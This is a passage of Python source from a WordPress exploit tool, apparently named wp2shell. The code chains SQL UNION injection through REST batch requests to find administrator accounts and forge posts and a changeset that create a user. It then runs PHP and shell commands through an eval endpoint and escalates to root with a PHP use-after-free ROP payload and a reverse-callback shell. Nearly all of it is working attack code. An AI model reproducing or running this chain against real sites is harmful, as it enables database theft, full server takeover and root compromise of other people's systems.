            request_timeout=request_timeout,
        )
        for marker in COMPAT_EVAL_MARKERS:
            if marker in shell_body:
                return True, shell_body.split(marker, 1)[1].strip()
        return False, shell_body[:600]

    def run_php_code(self, opener, plugin_slug: str, php_code: str) -> tuple[bool, str]:
        return self.run_php_url(opener, self.eval_url(plugin_slug), php_code)

    def probe_eval_url(self, opener, eval_url: str) -> tuple[str, str]:
        status, body = self._request_eval_url(
            opener, eval_url, f"echo '{EVAL_READY}';"
        )
        for marker in COMPAT_EVAL_MARKERS:
            if marker in body and EVAL_READY in body.split(marker, 1)[1]:
                return "compatible", marker
        if status in {404, 410}:
            return "missing", f"HTTP {status}"
        lowered = body.lower()
        looks_like_wordpress_soft_404 = (
            status == 200
            and ("<!doctype html" in lowered or "<html" in lowered)
            and (
                "/wp-content/themes/" in lowered
                or "?rest_route=/" in lowered
                or "wp-json" in lowered
                or '<meta name="generator" content="wordpress' in lowered
            )
        )
        if looks_like_wordpress_soft_404:
            return "missing", "WordPress front-controller soft 404"
        compact = " ".join(re.sub(r"<[^>]+>", " ", body[:500]).split())
        return "occupied", f"HTTP {status}: {compact[:300]}"

    def php_runtime_info(self, opener, plugin_slug: str) -> tuple[bool, dict | str]:
        return self.php_runtime_info_url(opener, self.eval_url(plugin_slug))

    def php_runtime_info_url(self, opener, eval_url: str) -> tuple[bool, dict | str]:
        ok, output = self.run_php_url(
            opener,
            eval_url,
            "echo json_encode(array("
            "'version'=>PHP_VERSION,"
            "'sapi'=>PHP_SAPI,"
            "'os'=>(defined('PHP_OS_FAMILY')?PHP_OS_FAMILY:PHP_OS),"
            "'int_size'=>PHP_INT_SIZE,"
            "'architecture'=>php_uname('m'),"
            "'zts'=>(defined('PHP_ZTS')?(bool)PHP_ZTS:false),"
            "'serializable_available'=>interface_exists('Serializable'),"
            "'unserialize_available'=>function_exists('unserialize'),"
            "'random_bytes_available'=>function_exists('random_bytes'),"
            "'fsockopen_available'=>function_exists('fsockopen'),"
            "'system_available'=>function_exists('system'),"
            "'disable_functions'=>(string)ini_get('disable_functions')"
            "));",
        )
        if not ok:
            return False, output
        try:
            info = json.loads(output)
        except json.JSONDecodeError:
            return False, f"unexpected runtime-information response: {output[:300]!r}"
        if not isinstance(info, dict):
            return False, f"runtime information was not an object: {info!r}"
        return True, info

    def run_shell_command(self, opener, plugin_slug: str, command: str) -> tuple[bool, str]:
        return self.run_shell_command_url(opener, self.eval_url(plugin_slug), command)

    def run_shell_command_url(
        self, opener, eval_url: str, command: str
    ) -> tuple[bool, str]:
        encoded_command = base64.b64encode(command.encode()).decode("ascii")
        return self.run_php_url(
            opener,
            eval_url,
            f"passthru(base64_decode('{encoded_command}'));",
        )

    def run_local_exploit_url(
        self,
        opener,
        eval_url: str,
        php_source: str,
        action_mode: str,
        action_payload: str,
    ) -> tuple[bool, str]:
        """POST the base64-fed local exploit and a base64-fed action value."""
        return self.run_php_url(
            opener,
            eval_url,
            php_source,
            request_parameters={
                "wpr_mode": action_mode,
                "wpr_payload": base64.b64encode(action_payload.encode()).decode("ascii"),
            },
            use_post=True,
        )

    def run_rop_url(
        self,
        opener,
        eval_url: str,
        php_source: str,
        pic_payload: bytes,
    ) -> tuple[bool, str]:
        """POST the ROP driver and caller-supplied raw PIC payload."""
        return self.run_php_url(
            opener,
            eval_url,
            php_source,
            request_parameters={
                "wpr_pic": base64.b64encode(pic_payload).decode("ascii"),
            },
            use_post=True,
        )


def confused_get(payload: str) -> dict:
    inner = [
        malformed(),
        widget_carrier(payload),
        {"method": "GET", "path": "/wp/v2/posts"},
    ]
    return wrap_inner(inner)


def _strings(value):
    """Yield every string nested in a decoded JSON response."""
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for child in value.values():
            yield from _strings(child)
    elif isinstance(value, list):
        for child in value:
            yield from _strings(child)


def scalar_probe(
    target: Target,
    expression: str,
    *,
    label: str,
    projection_hint: bool = False,
) -> str | None:
    """Extract one SQL scalar through a forged post's rendered content."""
    nonce = secrets.token_hex(8)
    start = f"W2S{nonce}A"
    end = f"W2S{nonce}Z"
    null_value = f"W2S{nonce}NULL"
    content_expr = (
        f"CONCAT({hx(start)},"
        f"COALESCE(CAST(({expression}) AS CHAR),{hx(null_value)}),"
        f"{hx(end)})"
    )
    row = post_row(
        "0",
        content_expr=content_expr,
        title="wp2shell probe",
        status="publish",
        name="wp2shell-probe",
        post_type="post",
    )
    status, body = target.batch(confused_get(union_payload([row])))
    try:
        decoded = json.loads(body)
    except json.JSONDecodeError:
        decoded = None

    if decoded is not None:
        for candidate in _strings(decoded):
            begin = candidate.find(start)
            finish = candidate.find(end, begin + len(start)) if begin >= 0 else -1
            if begin >= 0 and finish >= 0:
                value = candidate[begin + len(start):finish]
                return None if value == null_value else value

    hint = ""
    if projection_hint:
        hint = (
            " The chain requires the normal 23-column wp_posts.* projection. "
            "A patched SQL path, a posts_fields/posts_clauses filter, a modified "
            "wp_posts schema, or an external Redis/Memcached object cache forcing "
            "an ID-only split can cause this."
        )
    compact = " ".join(body[:500].split())
    raise ExploitError(
        f"{label} did not return its marker (HTTP {status}).{hint} Response: {compact!r}"
    )


def _canonical_site_url(value: str, *, ignore_scheme: bool = False) -> tuple:
    parts = urllib.parse.urlsplit(value)
    scheme = "" if ignore_scheme else parts.scheme.lower()
    host = (parts.hostname or "").lower()
    port = parts.port
    if (parts.scheme.lower(), port) in {("http", 80), ("https", 443)}:
        port = None
    path = parts.path.rstrip("/") or "/"
    return scheme, host, port, path


def add_query_marker(url: str, value: str) -> str:
    parts = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    query.append(("cache_session", value))
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path, urllib.parse.urlencode(query), parts.fragment)
    )


def discover_site_prefix(target: Target, requested: str, site_home: str) -> str:
    if requested.lower() != "auto":
        return checked_prefix(requested)

    tables_expr = (
        "SELECT GROUP_CONCAT(p.TABLE_NAME ORDER BY CHAR_LENGTH(p.TABLE_NAME),"
        "p.TABLE_NAME SEPARATOR 0x2c) FROM information_schema.TABLES p "
        "WHERE p.TABLE_SCHEMA=DATABASE() "
        f"AND RIGHT(p.TABLE_NAME,5)={hx('posts')} "
        "AND EXISTS(SELECT 1 FROM information_schema.TABLES o "
        "WHERE o.TABLE_SCHEMA=p.TABLE_SCHEMA AND o.TABLE_NAME="
        "CONCAT(LEFT(p.TABLE_NAME,CHAR_LENGTH(p.TABLE_NAME)-5),0x6f7074696f6e73))"
    )
    raw_tables = scalar_probe(target, tables_expr, label="table-prefix discovery")
    if not raw_tables:
        raise ExploitError(
            "no posts/options table pair was visible in the current database; pass --db-prefix explicitly"
        )

    prefixes: list[str] = []
    for table in raw_tables.split(","):
        if not table.endswith("posts"):
            continue
        prefix = checked_prefix(table[:-5])
        if prefix not in prefixes:
            prefixes.append(prefix)
    if not prefixes:
        raise ExploitError("prefix discovery returned no valid WordPress table names")

    homes: dict[str, str | None] = {}
    for prefix in prefixes:
        homes[prefix] = scalar_probe(
            target,
            f"SELECT option_value FROM {prefix}options "
            f"WHERE option_name={hx('home')} ORDER BY option_id LIMIT 1",
            label=f"home-option probe for prefix {prefix!r}",
        )

    exact = [
        prefix for prefix, home in homes.items()
        if home and _canonical_site_url(home) == _canonical_site_url(site_home)
    ]
    if len(exact) == 1:
        return exact[0]

    loose = [
        prefix for prefix, home in homes.items()
        if home and _canonical_site_url(home, ignore_scheme=True)
        == _canonical_site_url(site_home, ignore_scheme=True)
    ]
    if len(loose) == 1:
        return loose[0]
    if len(prefixes) == 1:
        return prefixes[0]

    details = ", ".join(
        f"{prefix!r} (home={homes[prefix]!r})" for prefix in prefixes
    )
    raise ExploitError(
        f"multiple WordPress prefixes were found and none matched uniquely: {details}; "
        "select one with --db-prefix"
    )


def validate_posts_schema(target: Target, prefix: str) -> None:
    columns_expr = (
        "SELECT GROUP_CONCAT(COLUMN_NAME ORDER BY ORDINAL_POSITION SEPARATOR 0x2c) "
        "FROM information_schema.COLUMNS "
        f"WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME={hx(prefix + 'posts')}"
    )
    raw_columns = scalar_probe(target, columns_expr, label="wp_posts schema discovery")
    columns = raw_columns.split(",") if raw_columns else []
    if columns == EXPECTED_POST_COLUMNS:
        return
    if len(columns) != len(EXPECTED_POST_COLUMNS):
        raise ExploitError(
            f"{prefix}posts has {len(columns)} physical columns, not the 23-column "
            "core layout required by this UNION"
        )
    raise ExploitError(
        f"{prefix}posts has 23 columns but a non-core order; refusing to map forged fields incorrectly"
    )


def discover_administrator(target: Target, site_prefix: str) -> tuple[int, str]:
    users_expr = (
        "SELECT GROUP_CONCAT(u.TABLE_NAME ORDER BY CHAR_LENGTH(u.TABLE_NAME),"
        "u.TABLE_NAME SEPARATOR 0x2c) FROM information_schema.TABLES u "
        "WHERE u.TABLE_SCHEMA=DATABASE() "
        f"AND RIGHT(u.TABLE_NAME,5)={hx('users')} "
        "AND EXISTS(SELECT 1 FROM information_schema.TABLES m "
        "WHERE m.TABLE_SCHEMA=u.TABLE_SCHEMA AND m.TABLE_NAME="
        "CONCAT(LEFT(u.TABLE_NAME,CHAR_LENGTH(u.TABLE_NAME)-5),0x757365726d657461))"
    )
    raw_tables = scalar_probe(target, users_expr, label="users-table discovery")
    if not raw_tables:
        raise ExploitError("no users/usermeta table pair was visible in the current database")

    tables = []
    for table in raw_tables.split(","):
        if table.endswith("users") and re.fullmatch(r"[A-Za-z0-9_]+", table):
            tables.append(table)
    base_guess = re.sub(r"\d+_$", "", site_prefix)
    preferred = [site_prefix + "users", base_guess + "users"]
    tables.sort(key=lambda table: (
        preferred.index(table) if table in preferred else len(preferred),
        len(table),
        table,
    ))

    capability_key = site_prefix + "capabilities"
    administrator_fragment = 's:13:"administrator";b:1;'
    for users_table in tables:
        user_prefix = users_table[:-5]
        usermeta_table = user_prefix + "usermeta"
        admin_expr = (
            f"SELECT u.ID FROM {users_table} u INNER JOIN {usermeta_table} m "
            "ON m.user_id=u.ID "
            f"WHERE m.meta_key={hx(capability_key)} "
            f"AND LOCATE({hx(administrator_fragment)},m.meta_value)>0 "
            "ORDER BY u.ID LIMIT 1"
        )
        value = scalar_probe(
            target, admin_expr, label=f"administrator probe in {users_table}"
        )
        if value and value.isdigit() and int(value) > 0:
            return int(value), users_table

        level_expr = (
            f"SELECT u.ID FROM {users_table} u INNER JOIN {usermeta_table} m "
            "ON m.user_id=u.ID "
            f"WHERE m.meta_key={hx(site_prefix + 'user_level')} "
            "AND CAST(m.meta_value AS UNSIGNED)>=10 ORDER BY u.ID LIMIT 1"
        )
        value = scalar_probe(
            target, level_expr, label=f"administrator-level probe in {users_table}"
        )
        if value and value.isdigit() and int(value) > 0:
            return int(value), users_table

    raise ExploitError(
        f"no administrator-capable user was found for capability key {capability_key!r}"
    )


def make_uuid(token: str) -> str:
    digest = hashlib.md5(("changeset-" + token).encode()).hexdigest()
    return f"{digest[:8]}-{digest[8:12]}-4{digest[13:16]}-8{digest[17:20]}-{digest[20:32]}"


def build_poison(
    prefix: str,
    cache_rows: dict[str, tuple[int, str]],
    username: str,
    changeset_uuid: str,
    admin_id: int,
    users_table: str,
) -> str:
    checked_prefix(prefix)
    if not re.fullmatch(r"[A-Za-z0-9_]+", users_table):
        raise ExploitError(f"unsafe users table name {users_table!r}")
    ids = {role: str(row[0]) for role, row in cache_rows.items()}
    cache_names = {role: row[1] for role, row in cache_rows.items()}

    changeset_prefix = '{"nav_menus_created_posts":{"value":['
    changeset_suffix = (
        f'],"type":"option","user_id":{admin_id},'
        f'"date_modified_gmt":"{OLD_DATE}"' + "}}"
    )
    changeset_expr = (
        f"CONCAT({hx(changeset_prefix)},CAST({ids['nav']} AS CHAR),"
        f"{hx(changeset_suffix)})"
    )

    rows = [
        post_row(
            ids["primary"], title="primary refresh trigger",
            status="publish", name=cache_names["primary"],
            parent=ids["changeset"], post_type="oembed_cache",
            author=str(admin_id),
        ),
        post_row(
            ids["changeset"], content_expr=changeset_expr,
            title="forged changeset", status="future",
            name=changeset_uuid, parent=ids["primary_peer"],
            post_type="customize_changeset",
            author=str(admin_id),
        ),
        post_row(
            ids["primary_peer"], title="primary loop peer",
            status="publish", name=cache_names["primary_peer"],
            parent=ids["changeset"], post_type="oembed_cache",
            author=str(admin_id),
        ),
        post_row(
            ids["nav"], title="nav publication trigger",
            status="auto-draft", name=cache_names["nav"],
            parent=ids["parse"], post_type="page",
            author=str(admin_id),
        ),
        post_row(
            ids["parse"], title="parse_request trigger",
            status="parse", name=cache_names["parse"],
            parent=ids["parse_peer"], post_type="request",
            author=str(admin_id),
        ),
        post_row(
            ids["parse_peer"], title="parse_request loop peer",
            status="parse", name=cache_names["parse_peer"],
            parent=ids["parse"], post_type="request",
            author=str(admin_id),
        ),
    ]

    # On the nested dispatch, user creation happens before this query. Suppress
    # the forged rows then, leaving the now-broken hierarchy loops one-shot.
    condition = (
        f"NOT EXISTS(SELECT 1 FROM {users_table} WHERE user_login={hx(username)})"
    )
    selects = [f"SELECT {row} FROM DUAL WHERE {condition}" for row in rows]
    return "0) AND 1=0 UNION ALL " + " UNION ALL ".join(selects) + "-- -"


def build_fire(embed_url: str, admin_id: int) -> str:
    content = f"[embed]{embed_url}[/embed]"
    row = post_row(
        "0", content=content, title="fire hierarchy repair",
        status="publish", name="wp2shell-fire", parent="0", post_type="post",
        author=str(admin_id),
    )
    return union_payload([row])


def build_seed(embed_urls: list[str], admin_id: int) -> str:
    content = "\n".join(f"[embed]{url}[/embed]" for url in embed_urls)
    row = post_row(
        "0", content=content, title="seed oEmbed cache rows",
        status="publish", name="wp2shell-seed", parent="0", post_type="post",
        author=str(admin_id),
    )
    return union_payload([row])


def seed_oembed_rows(
    target: Target,
    prefix: str,
    embed_urls: dict[str, str],
    admin_id: int,
) -> tuple[dict[str, tuple[int, str]], list[tuple[int, str]]]:
    """Seed and identify each real cache row without assuming embed dimensions."""
    maximum = scalar_probe(
        target,
        f"SELECT COALESCE(MAX(ID),0) FROM {prefix}posts",
        label="initial post-ID probe",
    )
    if maximum is None or not maximum.isdigit():
        raise ExploitError(f"the initial post-ID probe returned {maximum!r}")
    baseline = int(maximum)
    cache_rows: dict[str, tuple[int, str]] = {}
    responses: list[tuple[int, str]] = []

    for role, embed_url in embed_urls.items():
        status, response = target.batch(
            confused_get(build_seed([embed_url], admin_id))
        )
        responses.append((status, response))
        row_expr = (
            "SELECT CASE WHEN COUNT(*)=1 THEN "
            "CONCAT(MIN(ID),0x3a,MIN(post_name),0x3a,"
            f"MIN(IF(post_content={hx('{{unknown}}')},0,1))) "
            "ELSE CONCAT(0x434f554e543a,COUNT(*)) END "
            f"FROM {prefix}posts WHERE ID>{baseline} "
            f"AND post_type={hx('oembed_cache')}"
        )
        value = scalar_probe(
            target, row_expr, label=f"oEmbed cache-row discovery for {role}"
        )
        if not value or value.startswith("COUNT:"):
            count = value.split(":", 1)[1] if value and ":" in value else "0"
            raise ExploitError(
                f"seeding {role} produced {count} identifiable oEmbed rows after ID {baseline}; "
                "expected exactly one. Check the seed response and concurrent publishing activity"
            )
        parts = value.split(":", 2)
        if (
            len(parts) != 3
            or not parts[0].isdigit()
            or not re.fullmatch(r"[0-9a-fA-F]{32}", parts[1])
            or parts[2] not in {"0", "1"}
        ):
            raise ExploitError(f"unexpected oEmbed row descriptor for {role}: {value!r}")
        post_id = int(parts[0])
        if parts[2] == "0":
            raise ExploitError(
                f"WordPress created oEmbed row {post_id} for {role}, but cached '{{{{unknown}}}}'. "
                "Its server-side callback could not fetch/trust the public post URL; this is "
                "common with unreachable hostnames or self-signed HTTPS"
            )
        cache_rows[role] = (post_id, parts[1].lower())
        baseline = post_id

    return cache_rows, responses


def attack_stage_diagnostic(
    target: Target,
    prefix: str,
    cache_rows: dict[str, tuple[int, str]],
) -> str:
    changeset_id = cache_rows["changeset"][0]
    value = scalar_probe(
        target,
        "SELECT CONCAT(post_type,0x3a,post_status,0x3a,post_parent) "
        f"FROM {prefix}posts WHERE ID={changeset_id} LIMIT 1",
        label="post-attack changeset diagnostic",
    )
    if not value:
        return f"cache row {changeset_id} disappeared before the hierarchy trigger"
    post_type, _, remainder = value.partition(":")
    status, _, parent = remainder.partition(":")
    if post_type == "oembed_cache":
        return (
            f"cache row {changeset_id} is still oembed_cache/{status}; the forged WP_Post "
            "objects were not consumed (query/cache filters or persistent object cache are likely)"
        )
    if post_type == "customize_changeset" and status != "publish":
        return (
            f"cache row {changeset_id} became customize_changeset/{status}, but was not published"
        )
    if post_type == "customize_changeset" and status == "publish":
        return (
            f"changeset row {changeset_id} published (parent {parent}), but the nested user "
            "creation did not persist; the parse_request transition or capability context failed"
        )
    return f"cache row {changeset_id} ended as unexpected {post_type}/{status} (parent {parent})"


def show_eval_runtime(
    target: Target,
    opener,
    eval_url: str,
    *,
    allow_restricted_action: bool = False,
) -> tuple[bool, list[str], dict | None]:
    """Print endpoint/runtime details and report whether an OS shell is allowed."""
    print("[*] Runtime check")
    print(f"[+] Endpoint: {eval_url}")
    detected, runtime = target.php_runtime_info_url(opener, eval_url)
    if not detected:
        print(
            f"\n[-] The eval endpoint could not read PHP runtime information: {runtime}",
            file=sys.stderr,
        )
        return False, [], None
    assert isinstance(runtime, dict)
    version = str(runtime.get("version") or "unknown")
    sapi = str(runtime.get("sapi") or "unknown")
    php_os = str(runtime.get("os") or "unknown")
    disabled_raw = str(runtime.get("disable_functions") or "")
    disabled = [name.strip().lower() for name in disabled_raw.split(",") if name.strip()]
    architecture = str(runtime.get("architecture") or "unknown")
    thread_safety = "ZTS" if runtime.get("zts") else "NTS"
    int_size = runtime.get("int_size", "unknown")
    try:
        bitness = f"{int(int_size) * 8}-bit"
    except (TypeError, ValueError):
        bitness = "unknown bitness"
    print(f"[+] PHP: {version} / {sapi}")
    print(f"[+] Host: {php_os} / {architecture} / {thread_safety} / {bitness}")
    print(
        "[+] system() visible: "
        + ("yes" if runtime.get("system_available") else "no")
    )
    if disabled:
        print("[!] Disabled functions:")
        for offset in range(0, len(disabled), 4):
            print("    " + ", ".join(disabled[offset:offset + 4]))
    else:
        print("[+] disable_functions: empty")
    if disabled:
        if allow_restricted_action:
            print("[+] Restricted runtime confirmed")
            return False, disabled, runtime
        print("\n[-] Interactive shell blocked by disable_functions", file=sys.stderr)
        print(
            "    The eval endpoint itself remains available for PHP expressions.",
            file=sys.stderr,
        )
        return False, disabled, runtime
    return True, disabled, runtime


def load_local_exploit_source(
    explicit_path: str | None,
) -> tuple[str, pathlib.Path, int]:
    """Load and verify the packaged, web-dispatch-adapted local exploit."""
    script_dir = pathlib.Path(__file__).resolve().parent
    if explicit_path:
        candidates = [pathlib.Path(explicit_path).expanduser()]
    else:
        candidates = [
            script_dir / LOCAL_EXPLOIT_FILENAME,
            script_dir.parent / LOCAL_EXPLOIT_FILENAME,
        ]

    source_path = next((path for path in candidates if path.is_file()), None)
    if source_path is None:
        searched = ", ".join(str(path) for path in candidates)
        raise ExploitError(
            f"packaged {LOCAL_EXPLOIT_FILENAME} was not found (searched: {searched}); "
            "keep it beside wp2shell.py or pass --uaf-file"
        )

    try:
        raw_source = source_path.read_bytes()
    except OSError as exc:
        raise ExploitError(f"could not read {source_path}: {exc}") from exc
    digest = hashlib.sha256(raw_source).hexdigest()
    if digest != LOCAL_EXPLOIT_SHA256:
        raise ExploitError(
            f"refusing modified {source_path}: SHA-256 {digest}, "
            f"expected {LOCAL_EXPLOIT_SHA256}"
        )
    try:
        source = raw_source.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ExploitError(f"{source_path} is not valid UTF-8") from exc
    if not source.startswith("<?php"):
        raise ExploitError(f"{source_path} does not begin with the expected <?php tag")
    return source[len("<?php"):], source_path.resolve(), len(raw_source)


def load_rop_driver_source(
    explicit_path: str | None,
) -> tuple[str, pathlib.Path, int]:
    """Load and verify the packaged Serializable-UAF ROP driver."""
    script_dir = pathlib.Path(__file__).resolve().parent
    if explicit_path:
        candidates = [pathlib.Path(explicit_path).expanduser()]
    else:
        candidates = [
            script_dir / ROP_DRIVER_FILENAME,
            script_dir.parent / ROP_DRIVER_FILENAME,
        ]

    source_path = next((path for path in candidates if path.is_file()), None)
    if source_path is None:
        searched = ", ".join(str(path) for path in candidates)
        raise ExploitError(
            f"packaged {ROP_DRIVER_FILENAME} was not found (searched: {searched}); "
            "keep it beside wp2shell.py or pass --rop-file"
        )

    try:
        raw_source = source_path.read_bytes()
    except OSError as exc:
        raise ExploitError(f"could not read {source_path}: {exc}") from exc
    digest = hashlib.sha256(raw_source).hexdigest()
    if digest != ROP_DRIVER_SHA256:
        raise ExploitError(
            f"refusing modified {source_path}: SHA-256 {digest}, "
            f"expected {ROP_DRIVER_SHA256}"
        )
    try:
        source = raw_source.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ExploitError(f"{source_path} is not valid UTF-8") from exc
    if not source.startswith("<?php"):
        raise ExploitError(f"{source_path} does not begin with the expected <?php tag")
    return source[len("<?php"):], source_path.resolve(), len(raw_source)


def load_rop_payload(path_text: str) -> tuple[bytes, pathlib.Path]:
    payload_path = pathlib.Path(path_text).expanduser()
    if not payload_path.is_file():
        raise ExploitError(f"ROP payload file does not exist: {payload_path}")
    try:
        payload = payload_path.read_bytes()
    except OSError as exc:
        raise ExploitError(f"could not read {payload_path}: {exc}") from exc
    if not payload:
        raise ExploitError("ROP payload file is empty")
    if len(payload) > ROP_MAX_PAYLOAD_SIZE:
        raise ExploitError(
            f"ROP payload is {len(payload)} bytes; maximum supported size is "
            f"{ROP_MAX_PAYLOAD_SIZE} bytes"
        )
    return payload, payload_path.resolve()


def _default_root_artifact_path(filename: str) -> pathlib.Path:
    return pathlib.Path(__file__).resolve().parent / ROOT_BUILD_DIRNAME / filename


def load_root_helper_binary(explicit_path: str | None) -> tuple[pathlib.Path, bytes]:
    """Load a prebuilt x86_64 helper ELF produced by make."""
    helper_path = (
        pathlib.Path(explicit_path).expanduser()
        if explicit_path
        else _default_root_artifact_path(ROOT_HELPER_BINARY_FILENAME)
    )
    if not helper_path.is_file():
        raise ExploitError(
            f"prebuilt root helper was not found: {helper_path}; "
            f"run `make -C {pathlib.Path(__file__).resolve().parent}` "
            "or pass --helper-elf"
        )
    try:
        helper = helper_path.read_bytes()
    except OSError as exc:
        raise ExploitError(f"could not read {helper_path}: {exc}") from exc
    if len(helper) < 20 or not helper.startswith(b"\x7fELF"):
        raise ExploitError(f"{helper_path} is not an ELF helper binary")
    if helper[4:6] != b"\x02\x01" or helper[18:20] != b"\x3e\x00":
        raise ExploitError(f"{helper_path} is not a little-endian x86_64 ELF")
    return helper_path.resolve(), helper


def load_root_launcher_binary(explicit_path: str | None) -> tuple[pathlib.Path, bytes, int]:
    """Load the prebuilt raw PIC launcher template produced by make."""
    launcher_path = (
        pathlib.Path(explicit_path).expanduser()
        if explicit_path
        else _default_root_artifact_path(ROOT_LAUNCHER_FILENAME)
    )
    if not launcher_path.is_file():
        raise ExploitError(
            f"prebuilt root launcher was not found: {launcher_path}; "
            f"run `make -C {pathlib.Path(__file__).resolve().parent}` "
            "or pass --launcher-pic"
        )
    try:
        launcher = launcher_path.read_bytes()
    except OSError as exc:
        raise ExploitError(f"could not read {launcher_path}: {exc}") from exc
    magic_offset = launcher.find(ROOT_LAUNCHER_MAGIC)
    if magic_offset < 0:
        raise ExploitError(f"{launcher_path} is missing the root launcher manifest")
    fields_offset = magic_offset + len(ROOT_LAUNCHER_MAGIC)
    fields_size = ROOT_LAUNCHER_FIELD_COUNT * 8
    if fields_offset + fields_size > len(launcher):
        raise ExploitError(f"{launcher_path} has a truncated root launcher manifest")
    return launcher_path.resolve(), launcher, fields_offset


def _append_root_cstring(payload: bytearray, value: str) -> int:
    if "\x00" in value:
        raise ExploitError("root launcher arguments cannot contain a NUL byte")
    offset = len(payload)
    payload.extend(value.encode("utf-8") + b"\x00")
    return offset


def build_root_pic_payload(
    args: argparse.Namespace,
) -> tuple[bytes, dict[str, object]]:
    """Pack prebuilt helper and launcher artifacts into one raw x86_64 PIC blob."""
    control_token = secrets.token_hex(16)
    control_port = 49152 + secrets.randbelow(16384)
    control_endpoint = f"{control_port}:{control_token}"
    if args.priv_exec is not None:
        if not args.priv_exec:
            raise ExploitError("--priv-exec cannot be empty")
        if "\x00" in args.priv_exec:
            raise ExploitError("--priv-exec cannot contain a NUL byte")
        argv_tail = ["--priv-exec", control_endpoint, args.priv_exec]
        metadata: dict[str, object] = {
            "mode": "cmd",
            "control_port": control_port,
            "control_token": control_token,
        }
    else:
        argv_tail = ["--priv-shell", control_endpoint, ""]
        metadata = {
            "mode": "shell",
            "control_port": control_port,
            "control_token": control_token,
        }

    helper_path, helper_bytes = load_root_helper_binary(args.helper_elf)
    launcher_path, launcher_bytes, fields_offset = load_root_launcher_binary(
        args.launcher_pic
    )
    payload = bytearray(launcher_bytes)
    helper_offset = len(payload)
    payload.extend(helper_bytes)
    helper_argv0_offset = _append_root_cstring(payload, "root-helper")
    arg_offsets = [_append_root_cstring(payload, value) for value in argv_tail]
    struct.pack_into(
        "<QQQQQQ",
        payload,
        fields_offset,
        helper_offset,
        len(helper_bytes),
        helper_argv0_offset,
        arg_offsets[0],
        arg_offsets[1],
        arg_offsets[2],
    )
    if not payload:
        raise ExploitError("packed root launcher is empty")
    if len(payload) > ROP_MAX_PAYLOAD_SIZE:
        raise ExploitError(
            f"packed root launcher is {len(payload)} bytes; maximum supported size is "
            f"{ROP_MAX_PAYLOAD_SIZE} bytes"
        )
    metadata["helper_binary"] = helper_path
    metadata["launcher_template"] = launcher_path
    metadata["helper_size"] = len(helper_bytes)
    metadata["payload_size"] = len(payload)
    metadata["payload_sha256"] = hashlib.sha256(payload).hexdigest()
    return bytes(payload), metadata


def validate_local_exploit_runtime(runtime: dict, disabled: list[str]) -> None:
    """Reject runtimes outside the packaged primitive's explicit assumptions."""
    version = str(runtime.get("version") or "")
    version_match = re.match(r"^(\d+)\.(\d+)", version)
    if not version_match:
        raise ExploitError(f"could not parse PHP version {version!r}")
    major, minor = (int(value) for value in version_match.groups())
    if major != 8 or minor != 1:
        raise ExploitError(
            "the adapted packaged Serializable UAF is pinned to PHP 8.1 "
            f"(the upstream source advertises 8.0 through 8.5), not {version}"
        )
    if str(runtime.get("sapi") or "").lower() == "cli":
        raise ExploitError("--uaf-* requires a web SAPI, not PHP CLI")
    if "win" in str(runtime.get("os") or "").lower():
        raise ExploitError(
            "the packaged Serializable UAF supports Unix-like targets only"
        )
    try:
        int_size = int(runtime.get("int_size"))
    except (TypeError, ValueError) as exc:
        raise ExploitError("the endpoint did not report PHP_INT_SIZE") from exc
    if int_size != 8:
        raise ExploitError(
            "the packaged Serializable UAF requires 64-bit PHP, "
            f"got {int_size * 8}-bit"
        )
    if runtime.get("zts"):
        raise ExploitError(
            "the packaged Serializable UAF targets non-thread-safe (NTS) PHP only"
        )
    architecture = str(runtime.get("architecture") or "").lower()
    if architecture not in {"x86_64", "amd64", "aarch64", "arm64"}:
        raise ExploitError(
            "the packaged Serializable UAF supports x86_64 and aarch64, "
            f"not {architecture or 'an unreported architecture'}"
        )
    if not runtime.get("serializable_available"):
        raise ExploitError("the Serializable interface is unavailable in the target PHP runtime")
    if not runtime.get("unserialize_available"):
        raise ExploitError("unserialize() is unavailable in the target PHP runtime")
    if not runtime.get("random_bytes_available"):
        raise ExploitError("random_bytes() is unavailable in the target PHP runtime")
    if not disabled:
        raise ExploitError(
            "disable_functions is empty; the memory-corruption bypass is unnecessary, "
            "so use --exec-cmd or --shell instead"
        )
    if "system" not in disabled:
        raise ExploitError(
            "system is not in disable_functions; the packaged bypass is unnecessary"
        )


def validate_rop_runtime(runtime: dict) -> None:
    """Reject runtimes outside the packaged x86_64 Serializable ROP driver's assumptions."""
    version = str(runtime.get("version") or "")
    version_match = re.match(r"^(\d+)\.(\d+)", version)
    if not version_match:
        raise ExploitError(f"could not parse PHP version {version!r}")
    major, minor = (int(value) for value in version_match.groups())
    if major != 8 or minor != 1:
        raise ExploitError(
            "the packaged Serializable ROP driver is pinned to PHP 8.1, "
            f"not {version}"
        )
    if str(runtime.get("sapi") or "").lower() == "cli":
        raise ExploitError("--pic-file requires a web SAPI, not PHP CLI")
    if "win" in str(runtime.get("os") or "").lower():
        raise ExploitError("the packaged Serializable ROP driver supports Unix-like targets only")
    try:
        int_size = int(runtime.get("int_size"))
    except (TypeError, ValueError) as exc:
        raise ExploitError("the endpoint did not report PHP_INT_SIZE") from exc
    if int_size != 8:
        raise ExploitError(
            f"the packaged Serializable ROP driver requires 64-bit PHP, got {int_size * 8}-bit"
        )
    if runtime.get("zts"):
        raise ExploitError("the packaged Serializable ROP driver targets NTS PHP only")
    architecture = str(runtime.get("architecture") or "").lower()
    if architecture not in {"x86_64", "amd64"}:
        raise ExploitError(
            "the packaged Serializable ROP driver currently supports x86_64 only, "
            f"not {architecture or 'an unreported architecture'}"
        )
    if not runtime.get("serializable_available"):
        raise ExploitError("the Serializable interface is unavailable in the target PHP runtime")
    if not runtime.get("unserialize_available"):
        raise ExploitError("unserialize() is unavailable in the target PHP runtime")
    if not runtime.get("random_bytes_available"):
        raise ExploitError("random_bytes() is unavailable in the target PHP runtime")


def normalize_callback(callback: str, option: str) -> str:
    host, separator, port_text = callback.rpartition(":")
    if not separator or not host or not port_text.isdigit():
        raise ExploitError(f"{option} must use the form IPv4:port")
    try:
        address = ipaddress.ip_address(host)
    except ValueError as exc:
        raise ExploitError(f"{option} requires a literal IPv4 address") from exc
    if address.version != 4:
        raise ExploitError(f"{option} currently supports IPv4 callbacks only")
    port = int(port_text)
    if not 1 <= port <= 65535:
